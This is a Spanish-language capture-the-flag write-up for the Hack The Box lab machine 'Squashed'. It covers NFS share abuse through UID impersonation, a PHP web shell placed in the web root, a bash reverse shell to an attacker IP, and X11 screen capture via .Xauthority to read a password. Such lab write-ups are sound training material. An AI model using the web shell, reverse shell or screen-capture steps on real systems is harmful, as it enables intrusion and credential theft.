---
layout: single
title: Squashed - Hack The Box
excerpt: "En esta maquina se toca estos temas: Abusar de los propietarios asignados a los recursos compartidos de NFS mediante la creación de nuevos usuarios en el sistema  (Obtener acceso a la raíz web). Creación de un shell web para obtener acceso al sistema. Abuso del archivo .Xauthority (Pentesting X11). Tomar una captura de pantalla de la pantalla de otro usuario." 
date: 2023-04-17
classes: wide
header:
  teaser: /assets/images/HTB/writeup-squashed/Squashed.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy
  - CFTs
tags:
  - Privilege Escalation
  - Pentesting
  - Linux
  - NFS mount
---

![](/assets/images/HTB/writeup-squashed/Squashed.png)

***


**INDICE**

1. [Introducción](#Introducción)
2. [Reconocimiento](#reconocimiento).
    * [Reconocimiento de Puertos](#recon-nmap).
3. [Puertos](#Puerto2049).
4. [Escalada de Privilegios .Xauthority](☣️). 


    
***


## Introducción {Introducción}


"En esta maquina se toca estos temas: Abusar de los propietarios asignados a los recursos compartidos de NFS mediante la creación de nuevos usuarios en el sistema  (Obtener acceso a la raíz web). Creación de un shell web para obtener acceso al sistema. Abuso del archivo .Xauthority (Pentesting X11). Tomar una captura de pantalla de la pantalla de otro usuario."



Reconocimiento [](reconocimiento) {#reconocimiento}



## Reconocimiento de Puertos [🔍]

Como siempre antes de escanear los puertos con **Nmap** le hacemos un <span style="color:red"> ping </span> a la maquina victima para ver si esta viva y nos responde.


![](/assets/images/HTB/writeup-squashed/TrazaICMP.png)


En este caso nos responde y me arroja una **TTL** de 63, por lo que acercarse a 64, me enfrento a una maquina <span style="color:green"> Linux </span>.

| TTL    | Sistema Operativo | 
| :----- | :------- | 
| 64     | Linux    | 



Una vez que ya me comunique con la maquina y extraje el dato que es se trata de una maquina Linux, procedo a desplegar la herramienta Nmap.


```bash
# Primer con nmap  para sacar los puertos abiertos de la máquina
--------------------------------------------------------------
nmap -p- -n --open -sV --min-rate 5000 -vvv -n -Pn 10.10.11.191 
```

![](/assets/images/HTB/writeup-squashed/nmap1.png)


```bash
# Segundo escaneo con los scripts default de nmap y tambien sacamos  la Versión y Servicio que tiran los puertos escaneados anteriormente 
--------------------------------------------------------------
nmap -sC -sV -p22,80,111,2049,39033 10.10.11.191
```

![](/assets/images/HTB/writeup-squashed/nmap2.png)


## Puerto 2049 


Por lo que veo obtengo esta información, me doy cuenta que hay petisiones **nfs** en el **Puerto 2049**, al ser mi primera maquina de <span style="color:green"> HackTheBox </span>, acudo a <span style="color:red"> HackTricks </span>
para saber sobre NFS.

- [Recurso extraido de HackTricks](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting)



```bash
# Primero hay que avriguar  que carpetas tiene el servidor disponibles para montar, lo averiguamos con este comando
--------------------------------------------------------------------------------
showmount -e <IP>
```

![](/assets/images/HTB/writeup-squashed/shownmount.png)

Obtengo estos dos directorios:

|  /home/ross  |  /var/www/html  |

Y para montar estos dos directorios, me creo dos directorios llamados **/mnt/ross y /mnt/web_server** en el directorio **/mnt** y luego los monto


```bash
# Creo los directorios
----------------------
sudo mkdir /mnt/ross
sudo mkdir /mnt/web_server
# Monto los directorios en cada carpeta
sudo mount 10.10.11.191:/home/ross /mnt/ross
sudo mount 10.10.11.191:/var/www/html /mnt/web_server
```

Una vez que hecho esto, listo los directorios a ver que encuentro...


![](/assets/images/HTB/writeup-squashed/listadodedirectorios.png)


Veo que existe un archivo  <span style="color:red">Passwords.kdbx</span> que  básicamente su extension <span style="color:red">.kdbx</span> indica que es la base de datos que usa keepass para almacenar las contraseñas, tambien se ve que en directorio **./we_server** no despliega nada, voy a ver si puedo acceder a el...


![](/assets/images/HTB/writeup-squashed/cdwebserver.png)

Ok no tengo acceso a el, voy a ver que usuario tiene acceso el directorio


![](/assets/images/HTB/writeup-squashed/usuarioquetieneprivilegio.png)

Ok pensando un poco podria burlar el **user 2017** creando uno en mi maquina 


![](/assets/images/HTB/writeup-squashed/directorioswebserver.png)

Como estoy en el directorio del servidor web y veo el archivo **index.html** , probare intentar cargar un archivo .php para poder poder ejecutar cualquier comando en la **URL**

```bash
# Script php
----------------------
<?php   
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

Una ves ejecutado este script puedo ejecutar cualquier comando en la URL

![](/assets/images/HTB/writeup-squashed/cmd=ls-l.png)

Entonces puedo crear una Reverse Shell, pero antes me pongo en escucha con el puerto 1337 (en mi caso)



```bash
# Reverse Shell, encodear co el signo % al signo &
----------------------
bash -c "bash -i >%26 /dev/tcp/<IP ATACANTE>/1337 0>%261"
```

![](/assets/images/HTB/writeup-squashed/reverseshell.png)

Antes de continuar actualizo la tty 

```bash
> script /dev/null -c bash
--------------------------
> Ctrl+z
--------------------------
> stty raw -echo; fg 
        reset xterm
--------------------------
export TERM=xterm
export SHELL=bash
```



# Escalada de Privilegios .Xauthority ☣️


Para <span style="color:red">conseguir la escalada de privilegios sigo estos pasos</span>:

* Primero me creo otro usuario para tener acceso al archivo .Xauthority.

* Pero no tegno acceso al archivo. 


![](/assets/images/HTB/writeup-squashed/usuarioquetieneprivilegio.png)

* Monto un servidor http con python3 en el puerto 8080 en el usuario que me cree hace un momento.

```bash
# Servidor python3 
------------------
python3 -m http.server 8080
```

* Una vez ya descargado el archivo **.Xauthority**, con ayuda HackTricks busco el comando para poder leer dicho archivo.

- [Recurso extraido de HackTricks](https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11)


No lo puedo leer, entonces saco un screenshot a la seccion keepas abierta del usuario 



```bash
# Ejecuto el comando sacado de HakcTricks y lo guardo como archivo screenshot.xwd
------------------
xwd -root -screen -silent -display :0 > screenshot.xwd
```


![](/assets/images/HTB/writeup-squashed/Screenshotxwd.png)


Lo siguiente que hago es migrar a mi usuario de Kali para ponerme en escucha en el puerto 443, haci enviarme el archivo screenshot.xwd, dicho archivo se encuentra en el usuario **alex**


```bash
# Covierto el archivo .xwd a .png (esto comando se encuentra en HackTricks, el enlace anteriormente mencionado)
------------------
convert screenshot.xwd screenshot.png
```


![](/assets/images/HTB/writeup-squashed/convert.png)

Abro el screenshot y listo ahi se ve la **password**


![](/assets/images/HTB/writeup-squashed/screenshot.png)


Por ultimo me dirijo al usuario alex y con las **password** <span style="color:red">cah$mei7rai9A</span> para comvertirme el **root**



![](/assets/images/HTB/writeup-squashed/rootalex.png)

Ya tenemos acceso a la <span style="color:red"> **Flag**

